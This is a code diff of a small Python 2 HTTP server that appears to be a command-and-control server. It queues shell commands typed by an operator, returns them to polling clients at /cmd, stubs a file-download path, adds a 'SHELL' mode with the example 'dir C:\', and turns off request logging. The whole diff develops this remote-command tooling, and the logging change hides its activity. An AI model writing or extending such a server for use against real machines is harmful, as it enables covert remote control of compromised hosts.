@@ -22,16 +22,18 @@ PORT_NUMBER = 8080
 
 class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        command = self.path
-        if command == '/cmd':
-            if commands.empty():
-                content = 'NOOP'
-            else:
-                cmd = commands.get()
-                content = 'CMD\r\n%s' % cmd
-        elif command.startsWith('/f/'):
-            # Perform file download
-            content = 'Somefile'
+        # File download
+        if self.path.startswith('/f/'):
+            self.send_response(200)
+            self.send_header('content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write('xxx')
+            return
+
+        if commands.empty():
+            content = 'NOOP'
+        else:
+            content = commands.get()
 
         # Return result
         self.send_response(200)
@@ -51,6 +53,9 @@ class myHandler(BaseHTTPRequestHandler):
         self.wfile.write('OK')
         return
 
+    def log_message(self, format, *args):
+        return
+
 
 def run_httpserver():
     #commands.put('dir C:\\')
@@ -61,15 +66,52 @@ commands = Queue()
 
 try:
     # Start HTTP server thread
-    #run_httpserver() - Run without treads for debugging purposes
+    #run_httpserver() # Run without treads for debugging purposes
     httpserver = Thread(target=run_httpserver)
     httpserver.start()
 
     # Loop to add new commands
+    context = ''
     while True:
-        s = raw_input("> ")
-        if s.strip() != '':
-            commands.put(s)
+        s = raw_input("%s> " % context)
+        s = s.strip()
+
+        # In a context
+        if context == 'SHELL':
+            cmd = context
+
+            if s.upper() == 'EXIT':
+                context = ''
+                continue
+            else:
+                args = s
+
+                # Ignore empty commands
+                if not args:
+                    continue
+        # No context
+        else:
+            splitcmd = s.split(' ', 1)
+            cmd = splitcmd[0].upper()
+            args = ''
+
+            # Ignore empty commands
+            if not cmd:
+                continue
+
+            # Two options for input commands
+            # 1) Full command is entered, i.e.: SHELL dir C:\
+            if len(splitcmd) > 1:
+                args = splitcmd[1]
+            # 2) Only context change, i.e.: SHELL
+            elif cmd == 'SHELL':
+                context = 'SHELL'
+                continue
+            else:
+                print '%s > Unknown command: %s' % (context, s)
+
+        commands.put(' '.join([cmd, args]))
+
 
 except KeyboardInterrupt:
     print '^C received'
